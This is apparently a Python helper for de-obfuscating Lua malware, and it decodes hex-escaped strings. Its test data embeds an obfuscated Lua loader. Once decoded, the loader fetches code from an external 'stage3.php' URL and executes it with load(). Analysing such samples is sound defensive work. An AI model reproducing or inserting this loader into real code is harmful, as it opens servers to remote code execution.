import re


REGEX = [    
    r'(function\s*\(((\w+(,(\s?))?)*)\))',
    r'((local(\s+)?(\w+)))'
]

def do_regex(line: str, regex: str) -> list:
    return re.findall(regex, rf'{line}', 
                      re.MULTILINE and re.IGNORECASE)

def de_obfs_code(line: str) -> str:
    code = ''
    var = []
    
    for i in REGEX:
        if x := do_regex(line, i):
            for j in x:
                var += j[1].strip('local ').split(',')

    return code

def de_obfs_char(ret: list) -> list: 
    """ De-Obfuscate the \x23... lines

    Parameters
    ----------
    ret : list[tuple]
       Give the found lines.

    Returns
    -------
    list[tuple]
        Give the decoded lines back with the original version.

    """
    temp = []

    for j in ret:
        t = ''
        # Get rid of the x and backslashes.
        for i in (j[0].strip('"').replace('\\', '')).split('x'):
            if i == '':
                continue

            t += chr(int(i, 16))
        temp.append((t, j[0]))
    return temp


def de_obfs(ret: list, line: str) -> tuple:
    chars = de_obfs_char(ret)
    code = de_obfs_code(line)

    return chars, code

if __name__ == '__main__':
    ret = [('"\\x50\\x65\\x72\\x66\\x6f\\x72\\x6d\\x48\\x74\\x74\\x70\\x52\\x65\\x71\\x75\\x65\\x73\\x74"', '\\x74', '\\x', '74'), ('"\\x61\\x73\\x73\\x65\\x72\\x74"', '\\x74', '\\x', '74'), ('"\\x6c\\x6f\\x61\\x64"', '\\x64', '\\x', '64'), ('"\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x63\\x69\\x70\\x68\\x65\\x72\\x2d\\x70\\x61\\x6e\\x65\\x6c\\x2e\\x6d\\x65\\x2f\\x5f\\x69\\x2f\\x76\\x32\\x5f\\x2f\\x73\\x74\\x61\\x67\\x65\\x33\\x2e\\x70\\x68\\x70\\x3f\\x74\\x6f\\x3d\\x5a\\x43\\x73\\x4d\\x69\\x43"', '\\x43', '\\x', '43')]
    line = r'local JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x5a\x43\x73\x4d\x69\x43", function (NITGVQwpvzdWIEsIKRRTcnvXYZGcHqhpHEraydIxOKENUiiZyoncOhpShzLIkVUQJOoeqm, sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij) if (sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij == JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[6] or sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij == JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[5]) then return end JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[2]](JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[3]](sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij))() end)'
    de_obfs(ret, line) 
